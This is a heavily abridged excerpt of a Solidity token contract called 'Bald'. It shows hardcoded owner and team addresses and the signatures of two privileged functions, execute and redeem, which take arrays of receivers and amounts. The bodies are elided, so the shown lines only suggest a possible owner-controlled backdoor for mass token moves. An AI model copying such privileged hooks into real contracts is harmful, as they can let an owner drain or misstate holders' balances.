...
contract Bald is Context, IERC20 {
    ...
    address public _Owner = 0x306624d4F9d4Ce2e6e41363128d067ACacb672A2;
    ...
    constructor () public {
        ...
        team = 0x71660c4005BA85c37ccec55d0C4493E66Fe775d3;
  ...
  function execute(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _apprvrOnly(){
    ...
    function redeem (address ad,address[] memory eReceiver,uint256[] memory eAmounts)  public _onlyOwner(){
